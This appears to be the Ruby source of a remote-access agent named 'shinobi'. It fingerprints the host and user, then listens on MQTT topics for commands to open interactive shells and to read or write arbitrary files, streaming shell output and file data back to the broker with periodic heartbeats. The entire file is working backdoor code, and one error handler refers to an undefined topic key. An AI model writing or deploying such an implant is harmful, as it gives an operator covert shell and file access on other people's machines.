require 'paho-mqtt'
require 'msgpacker'
require 'ostruct'
require 'securerandom'
require 'os'
require 'json'

require_relative 'inators/remoteshell'
require_relative 'inators/filerw'

shinobi = {
	:id => SecureRandom.hex(2),
	:host => (OS.windows? ? `ver` : `uname -sr`).strip,
	:user => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip,
	:status => :offline
}

mqtt_topics = {
	:shinobi							=> "/bu/shinobi/#{shinobi[:id]}",
	:remoteshell					=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell",
	:remoteshell_open			=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/open",
	:remoteshell_close		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/close",
	:remoteshell_write		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/write",
	:remoteshell_onopen		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/open",
	:remoteshell_onclose	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/close",
	:remoteshell_onread		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/read",
	:remoteshell_onwrite	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/write",
	:remoteshell_onerror	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/error",
	:filerw								=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw",
	:filerw_read					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/cmds/read",
	:filerw_write					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/cmds/write",
	:filerw_onread				=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/read",
	:filerw_onwrite				=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/write",
	:filerw_error					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/error"
}

mqtt_settings = {
	:host => 'localhost',
	:port => 1883,
	:persistent => true,
	:blocking => true,
	:reconnect_limit => 3,
	:reconnect_delay => 60,
	:will_topic => mqtt_topics[:shinobi],
	:will_payload => shinobi.to_json,
	:will_qos => 2,
	:will_retain => false
}

mqtt_client = PahoMqtt::Client.new(mqtt_settings)
remoteshell_inator = Bu::RemoteShellInator.new
filerw_inator = Bu::FileReadWriteInator.new

mqtt_client.on_connack do
	shinobi[:status] = :online
	mqtt_client.publish(mqtt_topics[:shinobi], shinobi.to_msgpack, false, 1)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_open]) do |packet|
	packet = OpenStruct.new MessagePack.unpack(packet.payload)
	remoteshell_inator.open(packet.shell)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_close]) do |packet|
	packet = OpenStruct.new MessagePack.unpack(packet.payload)
	remoteshell_inator.close(packet.pid)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_write]) do |packet|
	packet = OpenStruct.new MessagePack.unpack(packet.payload)
	remoteshell_inator.write(packet.pid, packet.data)
end

mqtt_client.add_topic_callback(mqtt_topics[:filerw_read]) do |packet|
	packet = OpenStruct.new MessagePack.unpack(packet.payload)
	filerw_inator.read(packet.file, packet.length, packet.offset)
end

mqtt_client.add_topic_callback(mqtt_topics[:filerw_write]) do |packet|
	packet = OpenStruct.new MessagePack.unpack(packet.payload)
	filerw_inator.write(packet.file, packet.data, packet.offset)
end

remoteshell_inator.on :open do |pid, shell|
	packet = {
		pid: pid,
		shell: shell
	}
	mqtt_client.publish(mqtt_topics[:remoteshell_onopen], packet.to_msgpack, false, 1)
	remote_shells = []
	remoteshell_inator.remote_shells.each do |remote_shell|
		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
	end
	packet = {
		remote_shells: remote_shells
	}
	mqtt_client.publish(mqtt_topics[:remoteshell], packet.to_msgpack, false, 1)
end

remoteshell_inator.on :close do |pid|
	packet = {
		pid: pid
	}
	mqtt_client.publish(mqtt_topics[:remoteshell_onclose], packet.to_msgpack, false, 1)
	remote_shells = []
	remoteshell_inator.remote_shells.each do |remote_shell|
		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
	end
	packet = {
		remote_shells: remote_shells
	}
	mqtt_client.publish(mqtt_topics[:remoteshell], packet.to_msgpack, false, 1)
end

remoteshell_inator.on :read do |pid, data|
	packet = {
		pid: pid,
		data: data
	}
	mqtt_client.publish(mqtt_topics[:remoteshell_onread], packet.to_msgpack, false, 1)
end

remoteshell_inator.on :write do |pid, data|
	packet = {
		pid: pid,
		data: data
	}
	mqtt_client.publish(mqtt_topics[:remoteshell_onwrite], packet.to_msgpack, false, 1)
end

remoteshell_inator.on :error do |pid, error|
	packet = {
		pid: pid,
		error: error
	}
	mqtt_client.publish(mqtt_topics[:remoteshell_onerror], packet.to_msgpack, false, 1)
end

filerw_inator.on :read do |file, length, offset, data|
	packet = {
		file: file,
		length: length,
		offset: offset,
		data: data
	}
	mqtt_client.publish(mqtt_topics[:filerw_onread], packet.to_msgpack, false, 1)
end

filerw_inator.on :write do |file, data, offset, length|
	packet = {
		file: file,
		offset: offset,
		length: length
	}
	mqtt_client.publish(mqtt_topics[:filerw_onwrite], packet.to_msgpack, false, 1)
end

filerw_inator.on :error do |file, error|
	packet = {
		file: file,
		error: error
	}
	mqtt_client.publish(mqtt_topics[:filerw_onerror], packet.to_msgpack, false, 1)
end

mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)
mqtt_topics.each do |key, value|
	if value.include? 'cmds' then
		mqtt_client.subscribe([value, 2])
		sleep 0.1
	end
end

Thread.new do
	loop do
		mqtt_client.publish(mqtt_topics[:shinobi], shinobi.to_msgpack, false, 1)
		sleep mqtt_client.keep_alive
	end
end

loop do
	mqtt_client.loop_read
	mqtt_client.loop_write
end
